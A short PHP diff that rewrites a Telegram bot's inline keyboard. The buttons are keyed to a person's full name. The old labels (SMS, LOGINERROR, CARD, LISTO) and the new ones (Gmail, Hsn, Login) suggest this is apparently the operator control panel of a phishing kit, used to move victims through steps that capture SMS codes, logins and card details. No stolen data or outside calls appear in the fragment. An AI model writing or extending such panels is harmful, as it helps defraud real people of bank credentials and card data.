@@ -46,17 +46,9 @@ $uid = $nombres . ' ' . $apellidos;
 $keyboard = json_encode([
     'inline_keyboard' => [
         [
-            ['text' => '✅ SMS',        'callback_data' => "SMS|$uid"],
-            ['text' => '❌ SMSERROR',   'callback_data' => "SMSERROR|$uid"],
-        ],
-        [
-            ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$uid"],
-            ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$uid"],
-        ],
-        [
-            ['text' => '💳 CARD',       'callback_data' => "CARD|$uid"],
-            ['text' => '🏁 LISTO',      'callback_data' => "LISTO|$uid"],
-            ['text' => '🚫 ERROR',      'callback_data' => "ERROR|$uid"],
+            ['text' => '📧 Gmail',  'callback_data' => "GMAIL|$uid"],
+            ['text' => '🏦 Hsn',   'callback_data' => "HSN|$uid"],
+            ['text' => '🔐 Login', 'callback_data' => "LOGIN|$uid"],
         ],
     ]
 ]);
